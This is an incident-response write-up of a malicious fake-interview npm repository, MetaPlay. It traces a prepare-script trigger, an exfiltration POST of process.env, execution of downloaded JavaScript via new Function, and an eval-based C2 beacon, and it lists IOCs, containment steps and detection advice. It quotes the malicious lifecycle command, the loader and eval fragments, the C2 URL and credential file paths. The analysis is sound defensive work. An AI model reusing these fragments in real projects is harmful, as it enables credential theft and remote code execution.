# MetaPlay Supply-Chain Incident: Threat Surface and Exposure Assessment

> **Defensive disclosure note:** This write-up is published for defensive awareness and incident-response education. It documents a malicious fake-interview repository, npm lifecycle execution path, staged JavaScript behavior, observed IOCs, containment actions, and evidence boundaries. It intentionally avoids publishing live secrets or executable attacker payloads. Attribution is not asserted beyond the evidence described.

The victim did run root `npm i` during the live interview, triggering the malicious lifecycle path. During the later controlled analysis, no attacker-provided project code or fetched payload was executed.

## Defensive Learning Notebooks

The repository also contains a reviewed, reproducible notebook set for safe
static analysis and evidence reasoning:

- [Notebook guide](NOTEBOOKS.md)
- [Jupyter/NixOS setup](JUPYTER_SETUP.md)
- [Rendered static notebooks](docs/notebooks/index.html)

The notebooks use fake fixtures or already-public indicators. They do not
include or execute the captured second-stage payload.

## Safe Publication Checklist

Before publishing:

- [ ] No live secrets are included.
- [ ] No raw environment captures are included.
- [ ] No executable attacker payloads are included.
- [ ] Attribution is qualified and evidence-bound.
- [ ] The root `npm i` live execution is clearly distinguished from later controlled analysis.
- [ ] The reconstructed `nohup.out` evidence is labeled as reconstructed, not original preserved evidence.
- [ ] IOCs are provided with context.

## 1. Executive Summary

MetaPlay was a malicious interview repository designed to turn a routine dependency installation into code execution. The attacker placed a `prepare` lifecycle script in the root `package.json`. When the victim ran `npm i`, npm automatically invoked that script, which attempted to start `node server` in the background on both Windows and Unix-like systems.

During the live interview, the victim **did run `npm i` from the MetaPlay repository root**. That root install was not hypothetical or limited to later analysis; it was the real detonation point for the malicious npm lifecycle chain. The victim stopped before following the interviewer's second instruction, `cd client && npm i`.

The server imported `socket/index.js`. During module initialization, that file decoded a Vercel URL, caused `controllers/auth.js` to POST the complete Node `process.env`, accepted JavaScript in the response, and executed it with `new Function("require", response.data)`. The captured response was an obfuscated second stage that collected host identity data and `process.env`, attempted to contact a direct-IP command-and-control (C2) service every five seconds, and could execute C2-supplied JavaScript through `eval`.

**Practical conclusion:** this was a malicious software-supply-chain and social-engineering attack using npm lifecycle execution, environment-variable exfiltration, staged remote JavaScript, and remote command execution. Completed revocations, logouts, process cleanup, and network containment materially reduced the identified credential and callback risk; Claude removal/revocation remains pending unless separately confirmed. This conclusion is qualified as follows:

- **Confirmed by static evidence:** the malicious lifecycle trigger, import chain, complete environment POST, downloaded-code execution, captured second-stage behavior, C2 address, polling interval, remote-eval capability, and VS Code folder-open trigger.
- **Corroborated by screenshots and Git history:** the public repository displayed the malicious `prepare` command and instructed candidates to run the root install before a second client install. Branded recruiting collateral presented MetaPlay as a Ritual product centered on crypto rewards, NFTs, tokens, staking, and cross-chain gaming.
- **Likely:** the original Vercel POST succeeded because the later runtime error occurred inside the fetched stage-two path. The original Vercel request body is not independently preserved.
- **Not proven:** successful delivery of host information to the direct-IP C2; delivery of any follow-on remote-eval command; reading or exfiltration of SSH keys, GPG keys, browser data, wallet files, npm credentials, cloud credentials, or local CLI authentication files.

The current `MetaPlay/package.json` is analyst-modified for safe environment capture. The original lifecycle evidence is preserved identically in `MetaPlay/package.json.before-env-capture.596850`, the Git `HEAD` version, and `metaplay-live-fetch/codebase/MetaPlay/package.json` (SHA256 `c913a6b89e6f2d51cb9d6b45f75970cf571784453e85b3051b0409dabc1eb2f0`).

## 2. Timeline

### Phase 1: Live interview execution

1. The victim had not applied for this job. A person presenting as an official technical recruiter initiated contact and arranged the interview.
2. When the apparent interviewer joined the call, they said there was lag and asked for video to be disabled. The victim saw the interviewer for less than approximately three seconds. These are victim-reported interaction details and do not independently establish identity or attribution.
3. The victim cloned or opened the apparently ordinary Node/React repository during the live interview.
4. The victim ran `npm i` from the MetaPlay project root. This was the real execution event.
5. npm invoked the root `prepare` script: `start /b node server || nohup node server &`.
6. On Linux, the failed Windows `start /b` branch fell through to `nohup node server &`, starting the server in the background.
7. `server.js` loaded configuration and imported `socket/index.js`.
8. During module load, `socket/index.js` called `validateApiKey()`. It decoded `https://gamboracle.vercel.app/api`, and `controllers/auth.js` attempted to POST `{ ...process.env }` with header `x-app-request: ip-check`.
9. The Vercel response body was passed to `new Function("require", response.data)` and invoked with Node's `require`, entering the stage-two execution path.
10. The captured form of stage two collected hostname, operating-system information, one non-internal IPv4 interface's MAC address, and `process.env`. It attempted an immediate request to `http://136.243.22.62:1224/api/checkStatus`, scheduled another every 5,000 ms, and could `eval(message)` when a response reported `status === "error"`.
11. The victim stopped before running the requested second step, `cd client && npm i`.

#### Interview exit and post-contact OPSEC

- The victim did not accuse or directly confront the apparent interviewer. Instead, the victim stated a normal professional boundary: they do not run code on their machine without reading it first.
- The victim said they would review the code over the weekend and suggested scheduling another meeting afterward.
- This allowed the victim to end the interaction cleanly without alerting the operator that incident response would begin immediately.
- After the interaction, the apparent interviewer removed or deleted the LinkedIn account and the Gmail calendar invitation.
- The contact reportedly imitated the Ritual brand while using an `@ritualhub.net` email identity and the `Ritual-Products/` GitHub organization. The local repository evidence independently confirms the `Ritual-Products/MetaPlay` path; the email and social-account details are victim-reported incident context.
- The post-contact deletion is suspicious and consistent with disposable-identity or infrastructure burn after an interrupted operation. It does not independently prove who operated the attack or establish attribution.
- In combination with the malicious repository and live install pressure, the identity disappearance strengthens the assessment that this was likely a social-engineering operation using disposable identity infrastructure.

12. The victim disconnected the network or otherwise lost reachability before the direct-IP C2 completed. Runtime evidence was consistent with `connect ENETUNREACH 136.243.22.62:1224`. This strongly indicates that the observed direct-IP request failed, but it is not a packet capture.

### Phase 2: Initial containment

1. The victim searched for and killed suspicious Node, MetaPlay, socket-module, and C2-related processes.
2. The original `/home/arx/src/MetaPlay` working copy was removed.
3. npm installation artifacts and cache were cleaned during triage.
4. A blackhole route was added for `136.243.22.62/32`.
5. The host was checked for live Node listeners, remaining process/C2 references, and persistence indicators including cron, systemd, and shell-profile changes.
6. Relevant authentication material was inventoried and revocation or logout began.

### Phase 3: Controlled analysis and reconstruction

1. Evidence was rebuilt or moved under `~/lab/metaplay-attack`.
2. The Vercel endpoint was contacted with a controlled fake-environment POST to retrieve and preserve the second-stage response.
3. The fetched `stage2-response.js` was **not executed**.
4. Response headers, fetch metadata, SHA256 hashes, and IOCs were preserved.
5. The would-be `process.env` request body was reconstructed using analyst-created `.capture-vercel-env.cjs`; this file is not attacker code.
6. The host environment and on-disk credential surfaces were audited using redacted reports.
7. Exposed or potentially reachable authentication material was revoked, flushed, logged out, or queued for removal where completion was not documented.
8. The current `MetaPlay/package.json` reflects the safe capture modification. Original lifecycle evidence remains in `package.json.before-env-capture.596850`, Git `HEAD`, and the archived codebase copy.
9. The available June 12 `22:26` root npm log records `npm rm MetaPlay`, and the `22:30` client logs record uninstall/cleanup attempts. Those later logs are triage activity and do not contradict the victim's live-interview root install or show that the requested client install occurred.

## 3. Attack Chain Diagram

```mermaid
flowchart LR
    A["npm i"] --> B["prepare lifecycle"]
    B --> C["start /b node server<br/>or nohup node server &"]
    C --> D["server.js"]
    D --> E["socket/index.js module side effect"]
    E --> F["POST process.env to Vercel"]
    F --> G["new Function('require', response.data)"]
    G --> H["Obfuscated stage2"]
    H --> I["136.243.22.62:1224<br/>5-second polling"]
    I --> J["eval(message) when status === 'error'"]
```

## 4. Static Evidence Map

| File | Suspicious code | Behavior | Risk | Confidence |
|---|---|---|---|---|
| `MetaPlay/package.json.before-env-capture.596850:10` | `prepare: "start /b node server || nohup node server &"` | Runs the backend automatically during root installation and backgrounds it across Windows/Linux | Initial execution without explicit user consent | Confirmed |
| `MetaPlay/package.json` | Current `prepare` invokes `.capture-vercel-env.cjs` | Analyst modification for capture; not original attacker behavior | Evidence-handling caveat | Confirmed |
| `MetaPlay/.capture-vercel-env.cjs` | Reads `.env` and serializes `process.env` | Analyst-created reconstruction of the first-stage body | Could contain sensitive data if mishandled; not attacker code | Confirmed |
| `MetaPlay/server.js:3,8` | Requires `config` and `./socket/index` | Loads dotenv, then triggers malicious socket-module side effects before normal server operation | Hidden execution in ordinary startup | Confirmed |
| `MetaPlay/config.js:1-4` | `dotenv.config()` | Adds repository `.env` values to `process.env` before exfiltration | Expands exfiltration body | Confirmed |
| `MetaPlay/controllers/auth.js:67-72` | `atob`; `axios.post(api, { ...process.env }, ...)` | Decodes endpoint and sends the complete process environment with a misleading `ip-check` header | Environment and credential exfiltration | Confirmed |
| `MetaPlay/socket/index.js:48-84` | Top-level `validateApiKey()`; base64 URL; `new Function("require", response.data)` | Executes downloaded JavaScript with access to CommonJS `require` | Arbitrary code execution as the user | Confirmed |
| `MetaPlay/.env` | `AUTH_API` plus API/cloud-themed variables | Supplies an alternate Vercel endpoint and bait/demo values that normalize secret-looking configuration | Social camouflage and expanded env payload | Confirmed; values intentionally omitted |
| `MetaPlay/.vscode/tasks.json:7-19` | Hidden background `npm install -s`; `runOn: folderOpen` | Can trigger npm installation merely by opening/trusting the folder in VS Code | Secondary social trigger/persistence-like reactivation | Confirmed |
| `MetaPlay/.vscode/settings.json:4-8` | `files.exclude["**/.vscode"] = true` | Hides the folder containing the automatic task from the Explorer | Reduces discoverability | Confirmed |
| Git commit `98f07f5` | Bland message `update Users field` introduced `prepare`, the complete environment POST, `new Function`, BNB Smart Chain configuration, and error suppression together | Conceals a coordinated malicious change inside a large, ordinary-looking application update | Repository-history camouflage | Confirmed from local Git history |
| Git history through commit `7c0b71e` | Reused the full history of the unrelated `tcpie` project, then replaced its tree with a poker application | Made the repository appear old and active; the displayed 315-commit count was not genuine MetaPlay development history | Provenance laundering and false legitimacy | Confirmed; does not implicate inherited historical contributors |
| `screenshots/2026-06-13_02-13-20.png` | Unknown-sender warning, `@ritualhub.net` invitation, Google Meet/Calendly workflow | Corroborates unsolicited recruiting contact and a polished scheduling wrapper | Social-engineering infrastructure | Confirmed screenshot; identity attribution remains unproven |
| `screenshots/2026-06-13_02-14-05.png` through `02-14-38.png` | Ritual-branded company, MetaPlay, role, compensation, and benefits document | Supplies professional-looking collateral and crypto-native product claims | Brand impersonation and recruitment pretext | Confirmed screenshot content |
| `screenshots/2026-06-13_02-16-25.png` through `02-18-11.png` | Public repository, apparent contributors/history, crypto README, exact install instructions, malicious `prepare` line | Corroborates the technical trigger and legitimacy signals visible to the victim | Execution pressure and repository camouflage | Confirmed screenshot content |
| `metaplay-live-fetch/stage2-response.js` | Obfuscated `os`, `process.env`, `fetch`, timer, and `eval` logic | Profiles host, sends environment and host data to C2, polls, and executes commands | Surveillance and remote code execution | Confirmed |
| `metaplay-live-fetch/headers.txt` | HTTP 200, Vercel, 3,686-byte response | Records successful analyst retrieval of stage two | Confirms endpoint behavior at capture time, not necessarily original delivery | Confirmed |
| `metaplay-live-fetch/fetch-meta.txt` | `remote_ip=216.198.79.131` | Records the IP serving the Vercel response during analyst capture | Infrastructure IOC; CDN/serverless IP may be shared or change | Confirmed |
| `metaplay-live-fetch/SHA256SUMS.txt` | Stage-two digest | Preserves payload identity | Detection and evidence integrity | Confirmed and independently recomputed |
| `metaplay-live-fetch/metaplay-vercel-process-env-20260612-234329.json` | Reconstructed environment object | Shows the would-be first-stage request body, including bait values and session metadata | Defines exposure scope, but is not proof of attacker receipt | Confirmed reconstruction |
| `~/.npm/_logs/2026-06-12T22*` | Root `npm rm`; client uninstall commands | Records later cleanup, not the original meeting install | Prevents timeline misattribution | Confirmed |

## 5. Threat Surface Map

### npm and process execution

- **Lifecycle scripts:** `prepare` runs during a normal root install. The victim did not need to run `npm start`.
- **Backgrounding:** `nohup node server &` keeps execution outside the foreground npm process and reduces visible feedback.
- **Cross-platform branch:** `start /b node server` targets Windows; shell fallback to `nohup` targets Unix-like hosts.
- **Import side effects:** malicious behavior occurs while importing `socket/index.js`, before a user interacts with the application.
- **Error suppression:** `server.js` installs empty `uncaughtException` and `unhandledRejection` handlers, reducing diagnostic visibility.

### Environment exfiltration and staged execution

- **dotenv exposure:** `config.js` loads `.env` before `socket/index.js` performs verification.
- **Complete environment copy:** `controllers/auth.js` sends `{ ...process.env }`, not a restricted subset.
- **Staging service:** the first stage uses a Vercel URL, blending with common web-development infrastructure and keeping the second-stage implementation out of the repository.
- **Dynamic execution:** `new Function("require", response.data)` gives downloaded code direct access to Node modules and the victim's user permissions.
- **Obfuscation:** stage two uses identifier mangling, a rotated string table, and base64 decoding.
- **C2 beacon:** stage two uses a direct HTTP endpoint at `136.243.22.62:1224`.
- **Repeated polling:** it sends immediately and then every `0x1388`, or 5,000 ms.
- **Remote eval:** a response marked `status === "error"` is treated as executable JavaScript rather than an error message.

### Editor-triggered execution

- **Folder-open task:** `.vscode/tasks.json` launches a quiet npm install as a hidden background task when the folder is opened and trusted.
- **UI concealment:** `.vscode/settings.json` excludes `**/.vscode` from the file explorer, making the trigger less obvious.
- **Trust dependency:** VS Code normally requires workspace trust/task authorization in relevant configurations. The trap therefore relies partly on user trust or an already permissive setup; it is not unconditional operating-system persistence.

### Social-engineering and identity layer

- **Brand imitation:** the contact reportedly presented as associated with Ritual while using an `@ritualhub.net` identity and directing the victim to `Ritual-Products/MetaPlay`. This combination supplied a plausible company, email, and source-control wrapper around the payload.
- **Disposable identity risk:** the apparent recruiter/interviewer identity may have been fake or disposable. The later deletion of the LinkedIn account and Gmail invite is consistent with that assessment but does not independently prove attribution.
- **Professional pressure:** a live technical interview created time pressure and a strong incentive to appear cooperative.
- **Normalized first trigger:** running `npm i` was presented as ordinary project setup, concealing the root lifecycle detonation inside a familiar developer action.
- **Escalated second step:** after the root installation, the victim was asked to continue with `cd client && npm i`.
- **Low-friction refusal:** the victim framed refusal as standard code-review hygiene rather than an accusation, saying they do not run unread code locally.
- **Clean exit:** proposing weekend review and a follow-up meeting ended the interaction without revealing that containment would begin immediately.
- **Post-contact burn:** removal of the LinkedIn identity and Gmail invitation after the refusal is suspicious and consistent with social-infrastructure burn.
- **Combined attack surface:** the malicious code depended on the interview narrative, identity presentation, and professional pressure to reach execution. The social infrastructure was therefore as operationally important as the npm and JavaScript components.
- **Prepared collateral:** screenshots show an invitation workflow and a polished, branded Google document covering company background, product claims, open roles, compensation, and benefits. This reduced the chance that the repository request would appear isolated or improvised.
- **High-value lure:** the role document advertised a broad set of technical and executive openings with high salary and contractor-rate ranges, plus possible exposure to pre-launch tokens. Those claims increased the economic appeal of continuing the process.
- **Repository legitimacy cues:** the public GitHub page displayed a mature-looking commit count and multiple contributor avatars. Local Git history shows that the first 275 commits belonged to the unrelated `tcpie` project before a single large commit replaced the tree with the poker application. Visible age and contributor count were therefore unreliable trust signals.
- **Maturity mismatch:** at screenshot time, the public repository showed 315 commits but minimal stars/forks, no description or topics, and no releases or packages. This mismatch is not proof of malice by itself, but it weakens the apparent maturity signal.

### Crypto-targeting context

- **Crypto-native lure:** the repository presented itself as a Ritual-branded, multi-chain, play-to-earn gaming platform with crypto rewards, NFTs, smart contracts, staking, and token integration.
- **Collateral alignment:** the recruiting document independently described MetaPlay as a key product and emphasized real cryptocurrency rewards, NFT avatars, token governance/trading/purchases, staking, and cross-chain support. The social pretext and codebase were deliberately aligned around crypto.
- **Wallet interaction surface:** the client included `ethers`, a MetaMask connection helper, Ethereum chain-switch requests, wallet-address state, and wallet-address handling in the game socket flow.
- **BNB Smart Chain references:** server configuration included a BNB Smart Chain RPC URL alongside contract, NFT-contract, and client-deposit addresses.
- **Environment bait:** the repository `.env` used blockchain-provider and explorer variable names, increasing the chance that a crypto developer would normalize or expose related environment material.
- **Assessment:** these elements are consistent with deliberate targeting of a crypto-active developer and make crypto-asset theft a plausible operator objective. They also provide a credible pretext for later wallet connection, chain switching, deposit, or signing requests.
- **Evidence boundary:** no captured first- or second-stage code directly requests a seed phrase, reads a wallet private key, initiates a token transfer, or presents a malicious signature request. The victim did not run the requested client install. A purpose-built wallet drainer is therefore not proven by the preserved code.

### Local credential surfaces

Because downloaded code executed with `require`, it had the user's normal filesystem access. High-value paths included:

- GitHub CLI: `~/.config/gh/hosts.yml`
- OpenCode: `~/.local/share/opencode/auth.json` and `~/.config/opencode/opencode.jsonc`
- Codex CLI: `~/.codex/`, including local authentication state where present
- Claude: `~/.claude/.credentials.json` and related local state
- npm: `~/.npmrc`
- SSH: `~/.ssh/id_ed25519`, other private keys, agents, and configuration
- GPG: `~/.gnupg/private-keys-v1.d/`, keyrings, and agent state
- Browser profiles, cloud CLI profiles, wallet files, shell history, and other user-readable data

These paths define the **reachable threat surface**, not confirmed collection. The captured second stage references `os`, `process.env`, `fetch`, and `eval`; it contains no explicit file-reading logic. Only an unobserved C2-supplied eval payload would bridge the captured stage to arbitrary on-disk collection.

## 6. What Was Clever

- **Interview pressure:** the operator used an employment context to make cloning and installing an unfamiliar repository feel routine and time-sensitive.
- **`npm i` as the trigger:** dependency installation is an expected first step and lifecycle execution is easy to overlook.
- **Hidden `prepare`:** the malicious action was embedded among plausible development scripts rather than exposed as the normal start command.
- **Cross-platform startup:** the `start /b ... || nohup ... &` construction attempted to cover both Windows and Unix-like victims.
- **Import-time execution:** the exfiltration path was buried in a poker socket module and ran before normal application use.
- **Early environment capture:** dotenv loading and module side effects collected environment data before the victim had a reason to suspect the server.
- **Remote staging through Vercel:** the repository held only a loader. The attacker could change the payload server-side and benefit from a familiar HTTPS domain.
- **`new Function` with `require`:** the fetched script received Node module access, turning a small loader into arbitrary user-context execution.
- **Polling plus remote eval:** stage two combined reconnaissance, repeated callbacks, server-assigned identity, and an operator command channel.
- **VS Code social trap:** opening/trusting the folder could quietly run another npm install, while settings hid `.vscode` from the explorer.
- **Bait/demo `.env`:** plausible blockchain and cloud variable names made a secret-bearing environment file seem normal and increased the perceived legitimacy of environment access.
- **Clean social exit pressure:** the operator relied on the victim wanting to appear cooperative during an interview. The victim avoided tipping their hand by framing refusal as ordinary code-review policy rather than accusing the interviewer.
- **Layered legitimacy:** branded scheduling, a detailed role document, an apparently established GitHub organization, a substantial working poker application, and a long inherited commit history made the malicious loader a small part of a much larger credible-looking package.
- **History reuse:** retaining an unrelated project's decade-long commit history created an immediate appearance of repository maturity without requiring years of MetaPlay development.

## 7. What Was Amateur / Suspicious OPSEC

- **Obvious lifecycle IOC:** the cross-platform background command in `prepare` is highly suspicious on inspection.
- **Hardcoded endpoints:** both Vercel URLs and the direct-IP C2 are easily extracted.
- **Weak encoding and obfuscation:** base64 is not encryption, and the stage-two string-table obfuscation does not resist static analysis.
- **Broken asynchronous validation:** `validateApiKey()` is declared `async` but does not return the `verify(...)` chain. Its call therefore yields a truthy Promise, so `if (!verified)` is ineffective. The malicious request still executes asynchronously.
- **Noisy process behavior:** `nohup` can leave `nohup.out`, a detached Node process, a listening port, npm lifecycle metadata, and process-tree evidence. Later triage found no surviving `nohup.out`, but the design can create it.
- **Direct public IP:** stage two abandons the Vercel camouflage for a conspicuous fixed IP and uncommon port.
- **Plain HTTP C2:** traffic is observable and modifiable in transit.
- **Fragile C2 protocol:** the script expects JSON and uses the counterintuitive `status === "error"` condition to gate command execution.
- **Minimal persistence:** no robust boot, login, cron, systemd, browser-extension, or shell-profile persistence is present in the captured code. Persistence is limited to detached process lifetime and possible VS Code retriggering.
- **No captured file stealer:** the retrieved second stage does not enumerate credential files, browser stores, wallets, SSH keys, or GPG keys.
- **Easy detection strings:** `new Function`, `eval`, `process.env`, `axios.post`, `nohup`, base64 endpoints, `runOn: folderOpen`, and the direct IP provide straightforward static and network IOCs.
- **Disposable identity burn:** after the victim refused to continue and proposed reviewing the code later, the apparent interviewer deleted the LinkedIn account and Gmail invite. This is suspicious and consistent with infrastructure burn, though it is not proof by itself of who operated the attack.
- **Inconsistent provenance:** the repository claimed Ritual ownership while retaining legacy `0gRollplay`, Netlify, and unrelated `tcpie` history. The abrupt tree replacement and generic recent commit messages make the manufactured provenance discoverable through basic Git review.
- **Overloaded malicious commit:** commit `98f07f5` introduced the lifecycle trigger, environment exfiltration, downloaded-code execution, BNB Smart Chain values, and suppressed runtime errors under the unrelated message `update Users field`. The concentration of behavior makes historical triage straightforward.
- **Cover-application inconsistencies:** the README and configuration described a conventional authenticated application, but the login path hardcoded password validation as successful and referenced JWT configuration names not exported by `config.js`. These defects reinforce that the application was credible-looking cover rather than a production-quality product.

## 8. Exposure Assessment

### Confirmed exposed to the malicious code path

- The first-stage request body was the complete `process.env`.
- The reconstructed would-be body contains repository bait/demo keys: `ALCHEMY_API_KEY` (29 characters), `ETHERSCAN_API_KEY` (27), `POLYGONSCAN_API_KEY` (29), `INFURA_PROJECT_ID` (28), `AWS_ACCESS_KEY_ID` (16), `AWS_SECRET_ACCESS_KEY` (30), `AWS_REGION` (12), `AUTH_API` (48), and `NODE_ENV` (11). Values are intentionally not reproduced.
- It also contains local session and execution metadata, including user/home paths, working directories, shell, PATH and library paths, desktop/session identifiers, terminal information, npm lifecycle fields, Nix environment data, locale, editor, display/Wayland data, and process/session tokens used by local tooling.
- Static evidence proves these fields were selected for transmission. It does not by itself prove that the attacker retained the original incident request.

### Likely exposed to the first-stage Vercel endpoint

- The process environment present when `node server` ran.
- Repository `.env` bait/demo values loaded by dotenv.
- Local session metadata and path information.
- The original Vercel POST is likely because the later runtime error occurred inside the fetched stage-two path, but the original Vercel request body is not independently preserved. A contemporaneous packet capture, Vercel access log, endpoint telemetry, or preserved client trace would be required to prove delivery and its exact contents.

### Possible but not proven

- Hostname, OS release/platform, and one non-internal IPv4 interface MAC address. Stage two collected these, but `ENETUNREACH` indicates the observed direct-IP request likely failed.
- GitHub CLI OAuth token/PAT material, OpenCode NVIDIA NIM token, Codex CLI authentication, and Claude OAuth credentials. These were real on-disk credential surfaces. The captured stage two does not read them.
- npm tokens in `~/.npmrc`, SSH private keys, GPG private keys, browser cookies/session databases, cloud CLI credentials, wallet files, seed phrases, or other user-readable files.
- Any data reachable by a follow-on C2 command. Remote eval created the capability, but no delivered command body has been recovered.

Proof would require one or more of: endpoint/C2 server logs, packet capture or proxy logs with request bodies, EDR/audit records of file opens, shell/process telemetry showing a follow-on payload, filesystem access-time evidence with reliable timestamp semantics, recovered C2 responses, or attacker-side records.

### Not evidenced

- No captured code reads `~/.ssh`, `~/.gnupg`, browser profiles, wallet directories, `~/.npmrc`, GitHub CLI files, OpenCode files, Codex files, or Claude credential files.
- No evidence proves SSH or GPG private-key exfiltration.
- No evidence proves browser-cookie, wallet, npm-token, or cloud-credential exfiltration.
- No evidence proves a successful request to `136.243.22.62:1224`.
- No evidence proves that the victim ran the original `client` dependency install during the meeting. The later client npm logs are cleanup/triage commands.

## 9. Credential Rotation / Containment Performed

The response record and analyst account indicate the following actions:

### GitHub

- Revoked all GitHub OAuth tokens.
- Revoked all GitHub personal access tokens (PATs).
- Removed or invalidated GitHub CLI authentication state.
- Removed GitHub SSH-key trust.
- Removed GitHub GPG signing-key trust.

These were broad containment actions. They do not establish that the malicious code read the corresponding on-disk files or private keys.

### OpenCode / NVIDIA

- Identified OpenCode authentication material at `~/.local/share/opencode/auth.json`.
- Flushed or revoked the OpenCode NVIDIA NIM token.

### Codex / OpenAI

- Checked the OpenAI/Codex account side and found no active tokens displayed there.
- Logged out of the Codex CLI with `/logout`.

### Claude

- Identified the local Claude OAuth credential surface at `~/.claude/.credentials.json`.
- The victim reports no longer using Claude.
- The preserved redacted evidence shows that the credential file existed during the audit but does not document completed removal or revocation. It therefore remains classified as pending removal/revocation unless separately confirmed.

### npm

- Checked `~/.npmrc`.
- No npm authentication token was shown in the preserved redacted report.

This does not prove that no npm credential existed at any earlier time; it records only what the redacted review showed.

### Host and network

- Interrupted or lost network reachability during the malicious run.
- Added a blackhole route for `136.243.22.62/32`.
- Searched for and killed suspicious `node server`, MetaPlay, socket-module, and C2-related processes.
- Removed the original suspicious repository copy at `/home/arx/src/MetaPlay`.
- Cleaned npm cache and installation artifacts.
- Checked for live Node processes and listeners.
- Searched for persistence indicators and remaining references involving cron, systemd, shell profiles, the C2 address, and the malicious project.
- Preserved the reconstructed evidence set under `~/lab/metaplay-attack`.

### Evidence preservation

- Captured `metaplay-live-fetch/stage2-response.js` without executing it.
- Preserved `headers.txt`, `fetch-meta.txt`, `SHA256SUMS.txt`, and `IOCs.txt`.
- Preserved the reconstructed environment capture, including `metaplay-vercel-process-env-20260612-234329.json`.
- Preserved the secret-scrub and follow-up redacted reports.
- Preserved the original malicious manifest in `MetaPlay/package.json.before-env-capture.596850` and the archived codebase copy.

These actions reduce future credential reuse and callback risk. They do not retroactively prove what was or was not transmitted, and a negative process check only establishes that no matching process was observed at check time.

## 10. Remaining Risk

The victim did execute the root npm lifecycle chain during the interview. The remaining uncertainty is not whether the malicious loader ran; it did. The uncertainty is whether the second-stage direct-IP C2 request completed and whether any follow-on eval payload was delivered before network loss.

The captured stage two does not itself read credential files, although its remote-eval capability could have executed a server-provided file stealer or other Node-compatible code. The observed `ENETUNREACH` strongly suggests that the direct-IP C2 did not complete during the observed run. If the first-stage Vercel POST succeeded, the environment body was likely received before that failure. The Vercel endpoint and direct-IP C2 must therefore be evaluated separately.

Because the major real token surfaces identified during response were revoked, flushed, logged out, or queued for removal, remaining credential-abuse risk is **low but not zero**. Residual uncertainty covers any credential not inventoried, any data copied before revocation, any queued action not yet completed, and any unobserved remote-eval payload. Continued monitoring of relevant account audit logs is warranted, but the evidence does not support claiming broad host or wallet compromise.

## 11. IOCs

See the standalone [IOC reference](./IOCs.md) for a concise detection-oriented table.

| Type | Indicator | Context |
|---|---|---|
| URL | `https://gamboracle.vercel.app/api` | Hardcoded first-stage POST and stage-two delivery endpoint |
| URL | `https://ipcheck-six.vercel.app/api` | Alternate endpoint encoded in repository `.env` |
| URL | `http://136.243.22.62:1224/api/checkStatus` | Second-stage beacon and command endpoint |
| IP | `136.243.22.62` | Direct-IP C2; locally blackholed |
| IP | `216.198.79.131` | Vercel response IP recorded during analyst fetch; may be shared/ephemeral infrastructure |
| SHA256 | `bdc6b8a1c098ce32683d496e10c769cffe52ecd3a0c47b563b36849ca37bed7d` | Captured `stage2-response.js` |
| npm script | `start /b node server \|\| nohup node server &` | Malicious root `prepare` lifecycle command |
| Header | `x-app-request: ip-check` | First-stage POST marker |
| Code | `new Function("require", response.data)` | Downloaded JavaScript execution |
| Code | `status === "error"` followed by `eval(message)` | Remote command gate |
| VS Code | `.vscode/tasks.json` with `runOn: "folderOpen"` | Hidden quiet npm-install trigger |
| VS Code | `.vscode/settings.json` excluding `**/.vscode` | Conceals task configuration |
| Repository | `Ritual-Products/MetaPlay` | Repository attribution recorded in local IOC notes |

## Reconstructed Runtime Evidence

A reconstructed `nohup.out` excerpt is provided in [`NOHUP_RUNTIME_EVIDENCE.md`](./NOHUP_RUNTIME_EVIDENCE.md). It documents the observed `ENETUNREACH 136.243.22.62:1224` failure and explains why this supports stage-two execution while weighing against successful direct-IP C2 completion.

## 12. Lessons / Detection Ideas

- Disable npm lifecycle scripts by default when reviewing untrusted repositories.
- Prefer `npm install --ignore-scripts` only after inspecting the lockfile and manifest; this reduces lifecycle risk but does not make dependencies safe to execute later.
- Inspect all `package.json` scripts before installation, especially `preinstall`, `install`, `postinstall`, `prepare`, and custom start/dev commands.
- Search source and configuration for `new Function`, `eval`, `atob`, `Buffer.from(..., "base64")`, `process.env`, `axios.post`, `fetch`, `child_process`, `nohup`, detached processes, and encoded URLs.
- Audit `.vscode/tasks.json`, `.vscode/settings.json`, workspace files, dev-container hooks, launch configurations, and extension recommendations before trusting/opening a repository.
- Alert on folder-open tasks that invoke package managers or shells, particularly when presentation is hidden.
- Open interview and take-home repositories in disposable VMs or tightly constrained containers with no host credential mounts.
- Block or tightly control network egress during initial inspection and installation.
- Keep real authentication material out of the analysis environment. Use temporary, least-privilege credentials if networked testing is unavoidable.
- Never run interview code on a daily-use host containing wallets, cloud profiles, SSH agents, browser sessions, or developer CLI authentication.
- Detect Node processes spawned from npm lifecycle parents that detach, survive installation, or contact newly observed domains/direct IPs.
- Preserve packet capture, DNS/proxy logs, process ancestry, command lines, and file-access telemetry early. Those artifacts are needed to distinguish capability from successful exfiltration.

## 13. Final Judgment

- **Malicious repository:** Yes.
- **Combined operation:** The technical payload was paired with a social-engineering wrapper involving an apparent interview, Ritual brand imitation, a reported `@ritualhub.net` identity, and the `Ritual-Products/` GitHub organization.
- **Corroborating presentation evidence:** Screenshots preserve the unsolicited invitation, Ritual-branded recruiting document, crypto-focused MetaPlay description, exact root/client installation instructions, and malicious lifecycle line as they appeared in the public workflow.
- **Repository provenance:** The apparent 315-commit history was inherited from the unrelated `tcpie` project before the tree was replaced with a poker application. This is consistent with repository-history laundering to create age and legitimacy; it does not independently attribute the attack or implicate inherited contributors.
- **Intended purpose:** Environment/credential discovery and exfiltration, followed by staged remote command execution. The crypto-native lure and BNB Smart Chain, MetaMask, wallet, contract, and deposit-address surfaces are consistent with targeting crypto users and make crypto-asset theft a plausible broader objective.
- **Wallet-theft boundary:** No preserved payload directly steals a seed phrase or private key, initiates a transfer, or requests a malicious signature. A completed wallet-drainer flow is not proven.
- **Execution status:** The victim's root `npm i` during the live interview executed the malicious npm lifecycle chain. This was a real detonation event, not merely a theoretical finding from later analysis.
- **Mid-interview awareness:** The victim stopped before the interviewer-requested `cd client && npm i`, avoided direct confrontation, exited by invoking normal code-review policy, and immediately began containment.
- **Post-contact OPSEC:** The later deletion of the apparent interviewer's LinkedIn account and Gmail invitation is consistent with disposable-infrastructure burn after a failed or partially failed attempt. It is suspicious but does not independently prove attribution.
- **Likely first-stage exposure:** The attacker likely received the first-stage process environment because the observed later error occurred in the fetched stage-two path; the original Vercel request body is not independently preserved.
- **Direct-IP C2:** Successful completion is not proven and is contradicted by the observed `ENETUNREACH` during the relevant run.
- **Sophistication:** Medium concept; low-to-medium implementation. The social engineering and staging design were effective, but the code, obfuscation, protocol, and operational security were crude.
